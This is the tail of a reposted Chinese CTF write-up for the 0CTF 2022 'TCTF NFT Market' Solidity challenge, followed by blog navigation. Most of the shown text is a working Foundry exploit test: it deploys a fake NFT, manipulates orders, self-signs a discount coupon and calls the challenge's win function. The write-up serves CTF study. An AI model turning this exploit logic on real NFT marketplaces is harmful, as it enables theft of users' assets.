+<p>function safeTransferFrom(address, address, uint256) public override {</p>
+<p>}</p>
+<p>}</p>
+<p>&#x2F;&#x2F; foundry testing</p>
+<p>function setUp() public {</p>
+<p>vm.label(user, “user”);</p>
+<p>vm.label(deployer, “deployer”);</p>
+<p>vm.startPrank(deployer, deployer);</p>
+<p>market &#x3D; new TctfMarket();</p>
+<p>vm.stopPrank();</p>
+<p>token &#x3D; market.tctfToken();</p>
+<p>NFT &#x3D; market.tctfNFT();</p>
+<p>}</p>
+<p>function testExploit() public {</p>
+<p>vm.startPrank(user);</p>
+<p>fakeNFT &#x3D; new FakeNFT();</p>
+<p>emit log_address(address(fakeNFT));</p>
+<p>Coupon memory coupon;</p>
+<p>Signature memory signature;</p>
+<p>SignedCoupon memory scoupon;</p>
+<p>Order memory order;</p>
+<p>token.airdrop(); &#x2F;&#x2F; get 5 tokens</p>
+<p>fakeNFT.mint(address(market), 1);</p>
+<p>market.purchaseTest(address(fakeNFT), 1, 1337);</p>
+<p>token.approve(address(market), 1337 + 5);</p>
+<p>fakeNFT.mint(user, 2);</p>
+<p>fakeNFT.approve(address(fakeNFT), 2);</p>
+<p>market.createOrder(address(fakeNFT), 2, 1);</p>
+<p>market.purchaseOrder(0);</p>
+<p>market.purchaseOrder(1);</p>
+<p>coupon.orderId &#x3D; 1;</p>
+<p>coupon.newprice &#x3D; 1;</p>
+<p>coupon.issuer &#x3D; user;</p>
+<p>coupon.user &#x3D; user;</p>
+<p>coupon.reason &#x3D; “rkm0959”;</p>
+<p>order &#x3D; market.getOrder(0);</p>
+<p>bytes memory serialized &#x3D; abi.encode(</p>
+<p>“I, the issuer”, coupon.issuer,</p>
+<p>“offer a special discount for”, coupon.user,</p>
+<p>“to buy”, order, “at”, coupon.newprice,</p>
+<p>“because”, coupon.reason</p>
+<p>);</p>
+<p>(signature.v, signature.rs[0], signature.rs[1]) &#x3D; vm.sign(pvk, keccak256(serialized)); &#x2F;&#x2F; pvk &#x3D; user’s private key</p>
+<p>scoupon.coupon &#x3D; coupon;</p>
+<p>scoupon.signature &#x3D; signature;</p>
+<p>emit log_uint(uint256(signature.v));</p>
+<p>emit log_bytes32(signature.rs[0]);</p>
+<p>emit log_bytes32(signature.rs[1]);</p>
+<p>market.purchaseWithCoupon(scoupon);</p>
+<p>market.win();</p>
+<p>}</p>
+<p>Colored by Color Scripter</p>
+<p>原文始发于GitHub：0CTF 2022 TCTF NFT Market</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/58223.html">https://www.ctfiot.com/58223.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/0CTF_2022_TCTF_NFT_Market.full.md">CTF大赛WP集合&#x2F;articles&#x2F;0CTF_2022_TCTF_NFT_Market.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Solidity/">Solidity</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/01/01/ctf-kb/wp/Misc/%E7%AC%AC%E4%B8%89%E5%B1%8A-%E9%A6%99%E5%B1%B1%E6%9D%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/" title="第三届香山杯网络安全大赛初赛 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">第三届香山杯网络安全大赛初赛 Writeup</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/01/ctf-kb/wp/Web/2022-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-WriteUp/" title="第五空间 2022/Web + Pwn 合集"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">第五空间 2022/Web + Pwn 合集</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/01/01/ctf-kb/wp/Web/PARADIGM_CTF_2022%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-2-Source_Code%E5%88%86%E6%9E%90/" title="PARADIGM CTF 2022 题目分析 (2) - Source Code (EVM bytecode 自构造)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-01</div><div class="title">PARADIGM CTF 2022 题目分析 (2) - Source Code (EVM bytecode 自构造)</div></div></a></div><div><a href="/2022/01/01/ctf-kb/wp/Web/PARADIGM_CTF_2022%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-3-Lockbox2_%E5%88%86%E6%9E%90/" title="PARADIGM CTF 2022 题目分析 (3) - Lockbox2 (5 stage calls + ECDSA)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-01</div><div class="title">PARADIGM CTF 2022 题目分析 (3) - Lockbox2 (5 stage calls + ECDSA)</div></div></a></div><div><a href="/2022/01/01/ctf-kb/wp/Web/PARADIGM_CTF_2022%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-5-_Vanity_%E5%88%86%E6%9E%90/" title="PARADIGM CTF 2022 题目分析 (5) - Vanity (ECDSA 签名 + 16 字节 0x00)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-01</div><div class="title">PARADIGM CTF 2022 题目分析 (5) - Vanity (ECDSA 签名 + 16 字节 0x00)</div></div></a></div><div><a href="/2022/01/01/ctf-kb/wp/Web/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A2%98Revenge_NTF_WP/" title="强网拟态区块链 Revenge NTF - NFT Market CouponVerifierBeta ECDSA签名"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-01</div><div class="title">强网拟态区块链 Revenge NTF - NFT Market CouponVerifierBeta ECDSA签名</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
